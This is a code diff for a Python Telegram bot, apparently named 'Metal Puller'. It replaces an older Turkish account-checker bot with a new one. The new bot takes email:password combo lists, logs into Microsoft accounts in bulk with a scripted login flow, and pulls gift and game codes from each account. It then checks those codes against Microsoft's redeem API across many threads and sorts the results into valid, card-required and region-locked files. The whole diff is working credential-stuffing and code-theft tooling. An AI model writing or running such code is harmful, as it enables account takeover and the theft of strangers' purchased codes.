+            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$"},
+            timeout=10
+        )
+        login_request = login_response.text.replace('\\', '')
+        reurl_match = re.search(r'replace\(\"([^\"]+)\"', login_request)
+        if not reurl_match: return None
+        reurl = reurl_match.group(1)
+        
         try:
-            bot.edit_message_text(text, chat_id=context.chat_id, message_id=context.message_id, parse_mode="Markdown")
-        except:
-            pass
-    
-    safe_bot_call(bot.send_message, context.chat_id, "📦 *Tarama bitti! Dosyalarınız temizlenerek oluşturuluyor...*", parse_mode="Markdown")
-    
-    if context.purchased_items_list:
-        bio = io.BytesIO("\n".join(context.purchased_items_list).encode('utf-8'))
-        bio.name = "purchased_items.txt"
-        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"🎮 purchased_items.txt ({len(context.purchased_items_list)} Hesap)")
-
-    if context.subscriptions_list:
-        bio = io.BytesIO("\n".join(context.subscriptions_list).encode('utf-8'))
-        bio.name = "Subscriptions.txt"
-        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"📄 Subscriptions.txt ({len(context.subscriptions_list)} Hesap)")
-
-    if context.not_linked_list:
-        bio = io.BytesIO("\n".join(context.not_linked_list).encode('utf-8'))
-        bio.name = "NotLinked.txt"
-        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"🟨 NotLinked.txt ({len(context.not_linked_list)} Boş Hesap)")
-
-    if context.hit_list:
-        bio = io.BytesIO("\n".join(context.hit_list).encode('utf-8'))
-        bio.name = "All_Hits_Short.txt"
-        safe_bot_call(bot.send_document, context.chat_id, bio, caption="✅ Tüm Hit Giriş Bilgileri")
-
-    if context.chat_id in active_scans: del active_scans[context.chat_id]
-
-# ==========================================
-# 🚀 CORE TELEGRAM HANDLERS
-# ==========================================
-@bot.message_handler(commands=['start'])
-def cmd_start(message):
-    uid_str = str(message.from_user.id)
-    if uid_str not in db["users"]:
-        db["users"][uid_str] = {"lang": "tr", "expiry": "2026-12-31", "tier": "PREMIUM", "scans": 0, "hits": 0}
-        save_db()
-    safe_bot_call(bot.send_message, message.chat.id, LANG["tr"]["welcome"], reply_markup=lang_keyboard(), parse_mode="Markdown")
-
-@bot.message_handler(commands=['stop'])
-def cmd_stop(message):
-    if message.chat.id in active_scans:
-        active_scans[message.chat.id].is_running = False
-        safe_bot_call(bot.send_message, message.chat.id, "🛑 Tarama durduruldu.")
-
-def process_game_filter_step(message):
-    user_game_filter[message.from_user.id] = message.text.strip()
-    safe_bot_call(bot.send_message, message.chat.id, "📥 Filtre ayarlandı. Şimdi `.txt` listenizi gönderin.")
-
-@bot.message_handler(func=lambda msg: True, content_types=['text', 'document'])
-def handle_all(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-
-    if message.content_type == 'text':
-        text = message.text
-        if text == get_text(user_id, "btn_lang"):
-            safe_bot_call(bot.send_message, chat_id, "Dil seçin:", reply_markup=lang_keyboard())
-        elif text == get_text(user_id, "btn_check"):
-            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-            markup.row("skip")
-            msg = safe_bot_call(bot.send_message, chat_id, "🔍 Aranacak spesifik oyun adı girin veya geçmek için *skip* deyin:", reply_markup=markup, parse_mode="Markdown")
-            bot.register_next_step_handler(msg, process_game_filter_step)
-
-    elif message.content_type == 'document':
-        if not message.document.file_name.endswith('.txt'): return
-        if chat_id in active_scans: return
-
-        file_info = bot.get_file(message.document.file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
-        combos = [line.strip() for line in downloaded_file.decode('utf-8', errors='ignore').splitlines() if line.strip() and ':' in line]
-
-        if not combos: return
-
-        game_filter = user_game_filter.get(user_id, "skip")
-        context = BotScanContext(chat_id, user_id, combos, filter_str=game_filter)
-        active_scans[chat_id] = context
-
-        # 🚨 HATA ÇÖZÜMÜ: Mesajı direkt oluşturup ID'sini anında context'e yazıyoruz
-        text_ilk = generate_panel_text(context)
-        init_msg = safe_bot_call(bot.send_message, chat_id, text_ilk, reply_markup=main_keyboard(user_id), parse_mode="Markdown")
+            reresp = session.get(reurl, timeout=10).text
+        except Exception:
+            return None
+            
+        actch = re.search(r'<form.*?action="(.*?)".*?>', reresp)
+        if not actch: return None
+        acu = actch.group(1)
+        input_matches = re.findall(r'<input.*?name="(.*?)".*?value="(.*?)".*?>', reresp)
+        fta = {name: value for name, value in input_matches}
         
-        if init_msg:
-            context.message_id = init_msg.message_id
-            
-            # Yenileme döngüsünü ve işçi thread havuzunu eş zamanlı başlatıyoruz
-            threading.Thread(target=live_refresh_loop, args=(context,), daemon=True).start()
-            
-            def start_pool():
-                with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
-                    futures = [executor.submit(check_account_bot, context, cb) for cb in combos]
-                    concurrent.futures.wait(futures)
-            threading.Thread(target=start_pool, daemon=True).start()
+        try:
+            final_response = session.post(acu, data=fta, allow_redirects=True, timeout=10)
+            if final_response.status_code != 200: return None
+        except Exception:
+            return None
+        return session
+    except Exception:
+        return None
 
-@bot.callback_query_handler(func=lambda call: True)
-def handle_callbacks(call):
-    if call.data.startswith("set_lang_"):
-        lang = call.data.split("_")[2]
-        db["users"][str(call.from_user.id)]["lang"] = lang
-        save_db()
-        safe_bot_call(bot.send_message, call.message.chat.id, get_text(call.from_user.id, "main_menu"), reply_markup=main_keyboard(call.from_user.id), parse_mode="Markdown")
+def get_auth_token(session, force_refresh=False):
+    try:
+        if not force_refresh and hasattr(session, 'wlid_token'):
+            return session.wlid_token
+        session.get("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", timeout=5)
+        token_headers = {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': 'https://account.microsoft.com/billing/redeem'
+        }
+        token_response = session.get(
+            'https://account.microsoft.com/auth/acquire-onbehalf-of-token',
+            params={'scopes': 'MSComServiceMBISSL'},
+            headers=token_headers,
+            timeout=5
+        )
+        if token_response.status_code != 200: return None
+        token_data = token_response.json()
+        if not token_data: return None
+        token = token_data[0]['token']
+        session.wlid_token = token
+        return token
+    except Exception:
+        return None
 
-if __name__ == "__main__":
-    safe_bot_call(bot.remove_webhook)
-    bot.infinity_polling(skip_pending=True)
+def get_store_cart_state(session, force_refresh=False):
+    try:
+        if force_refresh and hasattr(session, 'store_state'):
+            delattr(session, 'store_state')
+        if not force_refresh and hasattr(session, 'store_state'):
+            return session.store_state
+            
+        token = get_auth_token(session, force_refresh)
+        if not token: return None
+        
+        ms_cv = "xddT7qMNbECeJpTq.6.2"
+        url = 'https://www.microsoft.com/store/purchase/buynowui/redeemnow'
+        params = {
+            'ms-cv': ms_cv,
+            'market': 'US',
+            'locale': 'en-GB',
+            'clientName': 'AccountMicrosoftCom'
+        }
+        payload = {'data': '{"usePurchaseSdk":true}', 'market': 'US', 'cV': ms_cv, 'locale': 'en-GB', 'msaTicket': token, 'pageFormat': 'full', 'urlRef': 'https://account.microsoft.com/billing/redeem', 'isRedeem': 'true', 'clientType': 'AccountMicrosoftCom', 'layout': 'Inline', 'cssOverride': 'AMC', 'scenario': 'redeem', 'timeToInvokeIframe': '4977', 'sdkVersion': 'VERSION_PLACEHOLDER'}
+        
+        response = session.post(url, params=params, data=payload, timeout=10)
+        text = response.text
+        match = re.search(r'window\.__STORE_CART_STATE__=({.*?});', text, re.DOTALL)
+        if not match: return None
+        
+        store_state = json.loads(match.group(1))
+        extracted_values = {
+            'ms_cv': store_state.get('appContext', {}).get('cv', ''),
+            'correlation_id': store_state.get('appContext', {}).get('correlationId', ''),
+            'tracking_id': store_state.get('appContext', {}).get('trackingId', ''),
+            'vector_id': store_state.get('appContext', {}).get('vectorId', ''),
+            'muid': store_state.get('appContext', {}).get('muid', ''),
+            'alternative_muid': store_state.get('appContext', {}).get('alternativeMuid', '')
+        }
+        session.store_state = extracted_values
+        return extracted_values
+    except Exception:
+        return None
+
+def prepare_redeem_api_call(session, code, headers, payload):
+    try:
+        return session.post(
+            'https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken',
+            headers=headers,
+            json=payload,
+            timeout=5
+        )
+    except Exception:
+        return None
+
+def validate_code_primary(session, code, force_refresh_ids=False):
+    try:
+        if not code or len(code) < 5 or ' ' in code or any(char in ['A', 'E', 'I', 'O', 'U', 'L', 'S', '0', '1', '5'] for char in code):
+            return {"status": "INVALID", "message": "Invalid code format"}
+        
+        store_state = get_store_cart_state(session, force_refresh=force_refresh_ids)
+        if not store_state:
+            store_state = get_store_cart_state(session, force_refresh=True)
+            if not store_state: return {"status": "ERROR", "message": "Failed to get store cart state"}
+        
+        token = get_auth_token(session, force_refresh=force_refresh_ids)
+        if not token:
+            token = get_auth_token(session, force_refresh=True)
+            if not token: return {"status": "ERROR", "message": "Failed to get authentication token"}
+        
+        headers = {
+            "host": "buynow.production.store-web.dynamics.com",
+            "connection": "keep-alive",
+            "x-ms-tracking-id": store_state['tracking_id'],
+            "sec-ch-ua-platform": "\"Windows\"",
+            "authorization": f"WLID1.0=t={token}",
+            "x-ms-client-type": "AccountMicrosoftCom",
+            "x-ms-market": "US",
+            "ms-cv": store_state['ms_cv'],
+            "x-ms-reference-id": generate_reference_id(),
+            "x-ms-vector-id": store_state['vector_id'],
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
+            "x-ms-correlation-id": store_state['correlation_id'],
+            "content-type": "application/json",
+            "x-authorization-muid": store_state['alternative_muid'],
+            "accept": "*/*",
+            "origin": "https://www.microsoft.com",
+            "referer": "https://www.microsoft.com/",
+            "accept-language": "en-US,en;q=0.9"
+        }
+        payload = {
+            "market": "US",
+            "language": "en-US",
+            "flights": ["sc_abandonedretry","sc_addasyncpitelemetry","sc_checkoutredeem"],
+            "tokenIdentifierValue": code,
+            "supportsCsvTypeTokenOnly": False,
+            "buyNowScenario": "redeem",
+            "clientContext": {"client": "AccountMicrosoftCom", "deviceFamily": "Web"}
+        }
+
+        response = prepare_redeem_api_call(session, code, headers, payload)
+        if not response: return {"status": "ERROR", "message": "Request failed"}
+        if response.status_code == 429: return {"status": "RATE_LIMITED", "message": "Account rate limited (HTTP 429)"}
+        if response.status_code != 200: return {"status": "ERROR", "message": f"Status code {response.status_code}"}
+        
+        data = response.json()
+        if "tokenType" in data and data["tokenType"] == "CSV":
+            return {"status": "BALANCE_CODE", "message": f"{code} | {data.get('value')} {data.get('currency')}"}
+        if "errorCode" in data and data["errorCode"] == "TooManyRequests":
+            return {"status": "RATE_LIMITED", "message": "Account rate limited"}
+        
+        if "events" in data and "cart" in data["events"] and data["events"]["cart"]:
+            cart_event = data["events"]["cart"][0]
+            if "data" in cart_event and "reason" in cart_event["data"]:
+                reason = cart_event["data"]["reason"]
+                if "TooManyRequests" in reason or "RateLimit" in reason:
+                    return {"status": "RATE_LIMITED", "message": f"Rate limited: {reason}"}
+                if reason == "RedeemTokenAlreadyRedeemed": return {"status": "REDEEMED", "message": f"{code} | REDEEMED"}
+                elif reason in ["RedeemTokenExpired", "LegacyTokenAuthenticationNotProvided", "RedeemTokenNoMatchingOrEligibleProductsFound"]:
+                    return {"status": "EXPIRED", "message": f"{code} | EXPIRED"}
+                elif reason == "RedeemTokenStateDeactivated": return {"status": "DEACTIVATED", "message": f"{code} | DEACTIVATED"}
+                elif reason == "RedeemTokenGeoFencingError": return {"status": "REGION_LOCKED", "message": f"{code} | REGION_LOCKED"}
+                elif reason in ["RedeemTokenNotFound", "InvalidProductKey", "RedeemTokenStateUnknown"]: return {"status": "INVALID", "message": f"{code} | INVALID"}
+        
+        if "products" in data and len(data["products"]) > 0:
+            product_info = data.get("productInfos", [{}])[0]
+            product_id = product_info.get("productId")
+            for product in data["products"]:
+                if product.get("id") == product_id:
+                    product_title = product.get("sku", {}).get("title", product.get("title", "Unknown Title"))
+                    is_pi_required = product_info.get("isPIRequired", False)
+                    status_lbl = "VALID_REQUIRES_CARD" if is_pi_required else "VALID"
+                    return {"status": status_lbl, "product_title": product_title, "message": f"{code} | {product_title}"}
+        return {"status": "UNKNOWN", "message": f"{code} | UNKNOWN"}
+    except Exception as e:
+        return {"status": "ERROR", "message": f"{code} | Error: {str(e)}"}
+
+# ============================================================================
+# ORCHESTRATION PIPELINES (THE THREE POWER MODES)
+# ============================================================================
+def execute_check_and_validation_pipeline(task_id, accounts):
+    """
+    Mode 1: Full pulling from Microsoft Accounts followed by high speed 
+    validation of extracted credentials into designated txt outputs.
+    """
+    task = ACTIVE_TASKS[task_id]
+    total_accs = len(accounts)
+    
+    # 1. Pulling phase
+    task["status_msg"] = "Phase 1/2: Pulling codes from MS Accounts..."
+    pulled_codes_pool = []
+    
+    with ThreadPoolExecutor(max_workers=45) as executor:
+        futures = {executor.submit(fetch_account_worker_standalone, acc[0], acc[1]): acc for acc in accounts}
+        for future in as_completed(futures):
+            if task["stop_requested"]: break
+            success, codes, msg = future.result()
+            task["total_pulled_accounts"] += 1
+            if success:
+                pulled_codes_pool.extend(codes)
+                task["total_pulled_codes"] += len(codes)
+    
+    if task["stop_requested"]:
+        task["status_msg"] = "Interrupted by user via /stop"
+        task["is_running"] = False
+        return
+
+    # De-duplicate pulled codes
+    unique_codes = list(set(pulled_codes_pool))
+    task["total_codes_to_check"] = len(unique_codes)
+    
+    # 2. Validation Phase
+    task["status_msg"] = f"Phase 2/2: Validating {len(unique_codes)} codes..."
+    
+    # Pre-login checking nodes to optimize performance
+    active_sessions = []
+    for acc in accounts[:10]: # Limit login infrastructure to prevent overkill
+        sess = login_microsoft_account(acc[0], acc[1])
+        if sess: active_sessions.append((sess, acc[0]))
+        if len(active_sessions) >= 3: break
+        
+    if not active_sessions:
+        task["status_msg"] = "Pipeline aborted: Failed to authenticate validation accounts."
+        task["is_running"] = False
+        return
+
+    code_queue = queue.Queue()
+    for c in unique_codes: code_queue.put(c)
+    
+    def validator_thread_loop(session_obj, email_addr):
+        while not code_queue.empty() and not task["stop_requested"]:
+            try:
+                code_item = code_queue.get_nowait()
+            except queue.Empty:
+                break
+                
+            res = validate_code_primary(session_obj, code_item)
+            status = res.get("status", "ERROR")
+            msg = res.get("message", f"{code_item} | {status}")
+            
+            with results_lock:
+                task["total_checked_codes"] += 1
+                if status in ['VALID', 'BALANCE_CODE']:
+                    task["valid_list"].append(msg)
+                elif status == 'VALID_REQUIRES_CARD':
+                    task["valid_card_list"].append(msg)
+                elif status in ['REDEEMED', 'EXPIRED', 'DEACTIVATED', 'INVALID']:
+                    task["invalid_list"].append(msg)
+                elif status == 'REGION_LOCKED':
+                    task["region_locked_list"].append(msg)
+                else:
+                    task["unknown_list"].append(msg)
+            code_queue.task_done()
+
+    threads = []
+    for idx, (sess, mail) in enumerate(active_sessions):
+        t = threading.Thread(target=validator_thread_loop, args=(sess, mail))
+        t.start()
+        threads.append(t)
+        
+    for t in threads: t.join()
+    
+    task["status_msg"] = "Pipeline operations completed successfully."
+    task["is_running"] = False
+
+def execute_check_only_pipeline(task_id, accounts):
+    """
+    Mode 2: Pull-Only framework. Logs into all accounts via thread nodes,
+    collects all codes, and skips the dynamics validation step.
+    """
+    task = ACTIVE_TASKS[task_id]
+    task["status_msg"] = "Executing High-Performance Pull Operations..."
+    
+    with ThreadPoolExecutor(max_workers=45) as executor:
+        futures = {executor.submit(fetch_account_worker_standalone, acc[0], acc[1]): acc for acc in accounts}
+        for future in as_completed(futures):
+            if task["stop_requested"]: break
+            success, codes, msg = future.result()
+            task["total_pulled_accounts"] += 1
+            if success:
+                task["total_pulled_codes"] += len(codes)
+                with results_lock:
+                    for c in codes:
+                        task["valid_list"].append(f"{c} | Extracted Offer")
+                        
+    task["status_msg"] = "Pull operations finished."
+    task["is_running"] = False
+
+# ============================================================================
+# TELEGRAM TELEMETRY & INLINE UI SYSTEM
+# ============================================================================
+bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher(storage=MemoryStorage())
+
+def make_dashboard_markup(task_id, finished=False):
+    kb = []
+    if not finished:
+        kb.append([InlineKeyboardButton(text="🛑 Force Terminate (Stop)", callback_data=f"stop_{task_id}")])
+    else:
+        kb.append([InlineKeyboardButton(text="🔄 Return to Dashboard Menu", callback_data="back_main")])
+    return InlineKeyboardMarkup(inline_keyboard=kb)
+
+async def live_results_monitoring_loop(msg_obj: types.Message, task_id: str, pipeline_mode: str):
+    """
+    Refreshes the live dashboard on the Telegram UI precisely every 5 seconds.
+    Outputs metrics, pulled items, and comprehensive statistics.
+    """
+    last_text = ""
+    while True:
+        await asyncio.sleep(5)
+        if task_id not in ACTIVE_TASKS: break
+        
+        task = ACTIVE_TASKS[task_id]
+        
+        # Calculate dynamic variables
+        elapsed = int(time.time() - task["start_time"])
+        cpm = int((task["total_checked_codes"] / elapsed) * 60) if elapsed > 0 else 0
+        if pipeline_mode == "check_only":
+            cpm = int((task["total_pulled_accounts"] / elapsed) * 60) if elapsed > 0 else 0
+
+        dashboard_ui = (
+            f"⚡ <b>METAL PULLER LIVE DASHBOARD</b> ⚡\n"
+            f"==================================\n"
+            f"⚙️ <b>Pipeline Mode:</b> {pipeline_mode.upper()}\n"
+            f"ℹ️ <b>Status:</b> {task['status_msg']}\n"
+            f"⏱️ <b>Time Elapsed:</b> {elapsed}s | <b>Est. CPM:</b> {cpm}\n"
+            f"==================================\n"
+            f"👥 <b>Accounts Loaded:</b> {task['total_pulled_accounts']}\n"
+            f"🎁 <b>Total Codes Found:</b> {task['total_pulled_codes']}\n"
+        )
+        
+        if pipeline_mode == "check_validation":
+            dashboard_ui += (
+                f"📥 <b>Validation Progress:</b> {task['total_checked_codes']}/{task['total_codes_to_check']}\n"
+                f"🟢 <b>Valid (Clean):</b> {len(task['valid_list'])}\n"
+                f"🟡 <b>Valid (Card Req):</b> {len(task['valid_card_list'])}\n"
+                f"🔵 <b>Region Locked:</b> {len(task['region_locked_list'])}\n"
+                f"🔴 <b>Invalid Codes:</b> {len(task['invalid_list'])}\n"
+                f"⚪ <b>Unknown Status:</b> {len(task['unknown_list'])}\n"
+            )
+            
+        dashboard_ui += f"==================================\n"
+        dashboard_ui += f"📡 <i>Live results refresh automatically every 5s</i>"
+
+        if dashboard_ui != last_text:
+            try:
+                await msg_obj.edit_text(dashboard_ui, reply_markup=make_dashboard_markup(task_id), parse_mode="HTML")
+                last_text = dashboard_ui
+            except Exception:
+                pass
+                
+        if not task["is_running"]:
+            break
+
+    # Final summary compile
+    await transmit_completed_manifest_outputs(msg_obj, task_id, pipeline_mode)
+
+async def transmit_completed_manifest_outputs(msg_obj: types.Message, task_id: str, pipeline_mode: str):
+    task = ACTIVE_TASKS[task_id]
+    await msg_obj.reply("🏁 <b>Pipeline sequence finalized. Compiling output packages...</b>", parse_mode="HTML")
+    
+    # Helper to generate input file inside memory buffers
+    def build_buffer(data_list):
+        return BufferedInputFile("\n".join(data_list).encode('utf-8'), filename="output.txt")
+
+    if pipeline_mode == "check_validation":
+        if task["valid_list"]:
+            await msg_obj.reply_document(document=build_buffer(task["valid_list"]), caption="🟢 valid_codes.txt")
+        if task["valid_card_list"]:
+            await msg_obj.reply_document(document=build_buffer(task["valid_card_list"]), caption="🟡 valid_cardrequired_codes.txt")
+        if task["region_locked_list"]:
+            await msg_obj.reply_document(document=build_buffer(task["region_locked_list"]), caption="🌍 region_locked_codes.txt")
+        if task["invalid_list"]:
+            await msg_obj.reply_document(document=build_buffer(task["invalid_list"]), caption="❌ invalid.txt")
+        if task["unknown_list"]:
+            await msg_obj.reply_document(document=build_buffer(task["unknown_list"]), caption="❓ unknown_codes.txt")
+            
+    elif pipeline_mode == "check_only":
+        if task["valid_list"]:
+            clean_codes = [c.split(" | ")[0] for c in task["valid_list"]]
+            await msg_obj.reply_document(document=build_buffer(clean_codes), caption="📥 pulled_codes.txt")
+            
+    # Cleanup memory trace
+    if task_id in ACTIVE_TASKS:
+        del ACTIVE_TASKS[task_id]
+
+# ============================================================================
+# BOT COMMAND HANDLERS & NAVIGATION INTERFACES
+# ============================================================================
+def build_welcome_menu():
+    buttons = [
+        [InlineKeyboardButton(text="⚡ Check And Validation", callback_data="menu_check_val")],
+        [InlineKeyboardButton(text="📥 Check (Pull Only)", callback_data="menu_check_only")],
+        [InlineKeyboardButton(text="🔮 Sort Categories", callback_data="menu_sort")]
+    ]
+    return InlineKeyboardMarkup(inline_keyboard=buttons)
+
+@dp.message(Command("start"))
+async def start_cmd_handler(message: types.Message, state: FSMContext):
+    if OWNER_ID and message.from_user.id != OWNER_ID:
+        await message.reply("❌ Access Denied: You are not authorized to use Metal Puller.")
+        return
+        
+    await state.clear()
+    welcome_text = (
+        "🤖 <b>Welcome to Metal Puller Bot Platform!</b>\n"
+        "=========================================\n"
+        "High performance structural script engineered for \n"
+        "rapid async Microsoft / Xbox data sourcing.\n\n"
+        "Select your operation mode from the control panel below:"
+    )
+    await message.reply(welcome_text, reply_markup=build_welcome_menu(), parse_mode="HTML")
+
+@dp.message(Command("stop"))
+async def stop_cmd_handler(message: types.Message):
+    if OWNER_ID and message.from_user.id != OWNER_ID: return
+    
+    if not ACTIVE_TASKS:
+        await message.reply("ℹ️ No operational automation sequences are currently active.")
+        return
+        
+    for tid, tdata in ACTIVE_TASKS.items():
+        tdata["stop_requested"] = True
+        tdata["is_running"] = False
+        tdata["status_msg"] = "Termination requested via command."
+        
+    await message.reply("🛑 <b>Termination command signaled globally to all background workers.</b>", parse_mode="HTML")
+
+# ============================================================================
+# CALLBACK ROUTERS
+# ============================================================================
+@dp.callback_query(F.data == "back_main")
+async def back_main_callback(callback: types.CallbackQuery, state: FSMContext):
+    await state.clear()
+    welcome_text = (
+        "🤖 <b>Welcome to Metal Puller Bot Platform!</b>\n"
+        "=========================================\n"
+        "Select your operation mode from the control panel below:"
+    )
+    await callback.message.edit_text(welcome_text, reply_markup=build_welcome_menu(), parse_mode="HTML")
+
+@dp.callback_query(F.data.startswith("stop_"))
+async def stop_button_callback(callback: types.CallbackQuery):
+    tid = callback.data.split("_")[1]
+    if tid in ACTIVE_TASKS:
+        ACTIVE_TASKS[tid]["stop_requested"] = True
+        ACTIVE_TASKS[tid]["is_running"] = False
+        ACTIVE_TASKS[tid]["status_msg"] = "Terminated via control panel button."
+        await callback.answer("Signaling worker cleanup sequence...")
+    else:
+        await callback.answer("Task sequence already inactive.")
+
+@dp.callback_query(F.data == "menu_check_val")
+async def check_val_callback(callback: types.CallbackQuery, state: FSMContext):
+    await callback.message.edit_text(
+        "📝 <b>Mode: Check And Validation</b>\n\n"
+        "Please send the account configuration list in the following format:\n"
+        "<code>email:password</code>\n"
+        "<code>email:password</code>",
+        parse_mode="HTML"
+    )
+    await state.set_state(BotStates.waiting_for_accounts_check_validation)
+
+@dp.callback_query(F.data == "menu_check_only")
+async def check_only_callback(callback: types.CallbackQuery, state: FSMContext):
+    await callback.message.edit_text(
+        "📥 <b>Mode: Check (Pull Only)</b>\n\n"
+        "Please transmit your account credentials array matching the raw criteria:\n"
+        "<code>email:password</code>",
+        parse_mode="HTML"
+    )
+    await state.set_state(BotStates.waiting_for_accounts_check_only)
+
+@dp.callback_query(F.data == "menu_sort")
+async def sort_callback(callback: types.CallbackQuery, state: FSMContext):
+    await callback.message.edit_text(
+        "🔮 <b>Mode: Lexical Sort Engine</b>\n\n"
+        "Please drop your raw code arrays to structure them into item modules:\n"
+        "Format: <code>CODE | Title Name</code> or raw strings.",
+        parse_mode="HTML"
+    )
+    await state.set_state(BotStates.waiting_for_codes_to_sort)
+
+# ============================================================================
+# STATE TRANSITION INGESTION PROCESSING
+# ============================================================================
+@dp.message(BotStates.waiting_for_accounts_check_validation)
+async def process_check_val_input(message: types.Message, state: FSMContext):
+    accs = parse_accounts_data(message.text)
+    if not accs:
+        await message.reply("❌ Input string contains zero executable account arrays. Try again.")
+        return
+        
+    await state.clear()
+    task_id = str(uuid.uuid4())[:8]
+    ACTIVE_TASKS[task_id] = {
+        "start_time": time.time(),
+        "is_running": True,
+        "stop_requested": False,
+        "status_msg": "Initializing pipeline structure...",
+        "total_pulled_accounts": 0,
+        "total_pulled_codes": 0,
+        "total_codes_to_check": 0,
+        "total_checked_codes": 0,
+        "valid_list": [],
+        "valid_card_list": [],
+        "invalid_list": [],
+        "region_locked_list": [],
+        "unknown_list": []
+    }
+    
+    monitoring_msg = await message.reply("⚡ <b>Spawning validation infrastructure layers...</b>", parse_mode="HTML")
+    
+    # Offload thread pool matrix execution safely
+    threading.Thread(target=execute_check_and_validation_pipeline, args=(task_id, accs)).start()
+    asyncio.create_task(live_results_monitoring_loop(monitoring_msg, task_id, "check_validation"))
+
+@dp.message(BotStates.waiting_for_accounts_check_only)
+async def process_check_only_input(message: types.Message, state: FSMContext):
+    accs = parse_accounts_data(message.text)
+    if not accs:
+        await message.reply("❌ Critical error parsing account context strings.")
+        return
+        
+    await state.clear()
+    task_id = str(uuid.uuid4())[:8]
+    ACTIVE_TASKS[task_id] = {
+        "start_time": time.time(),
+        "is_running": True,
+        "stop_requested": False,
+        "status_msg": "Initializing pulling configuration parameters...",
+        "total_pulled_accounts": 0,
+        "total_pulled_codes": 0,
+        "total_checked_codes": 0,
+        "valid_list": []
+    }
+    
+    monitoring_msg = await message.reply("📥 <b>Spawning code extractor instances...</b>", parse_mode="HTML")
+    
+    threading.Thread(target=execute_check_only_pipeline, args=(task_id, accs)).start()
+    asyncio.create_task(live_results_monitoring_loop(monitoring_msg, task_id, "check_only"))
+
+@dp.message(BotStates.waiting_for_codes_to_sort)
+async def process_sorting_input(message: types.Message, state: FSMContext):
+    await state.clear()
+    lines = message.text.split('\n')
+    game_groups = {}
+    
+    for line in lines:
+        line = line.strip()
+        if not line: continue
+        if '|' in line:
+            code, game_name = line.split('|', 1)
+            code = code.strip()
+            game_name = game_name.strip()
+            gtype = extract_game_type(game_name)
+            if gtype not in game_groups: game_groups[gtype] = []
+            game_groups[gtype].append((code, game_name))
+        else:
+            if 'Other' not in game_groups: game_groups['Other'] = []
+            game_groups['Other'].append((line, 'Unknown Offer'))
+            
+    formatted_data = format_game_codes_output(game_groups)
+    timestamp = datetime.now().strftime("%Y%m%d")
+    
+    file_bytes = formatted_data.encode('utf-8')
+    input_file = BufferedInputFile(file_bytes, filename=f"sortedcodes_{timestamp}.txt")
+    
+    await message.reply_document(document=input_file, caption=f"🔮 Sorted manifest package processed safely.")
+
+# ============================================================================
+# RUN-LOOP EXECUTION TRIGGER
+# ============================================================================
+async def main():
+    print("==================================================")
+    print("🚀 METAL PULLER BOT SERVICE LAYER INITIALIZING")
+    print(f"📡 Target Server Platform Instance Year: {datetime.now().year}")
+    print("==================================================")
+    await dp.start_polling(bot)
+
+if __name__ == '__main__':
+    try:
+        asyncio.run(main())
+    except (KeyboardInterrupt, SystemExit):
+        print("\n🛑 Execution processes stopped securely.")
 
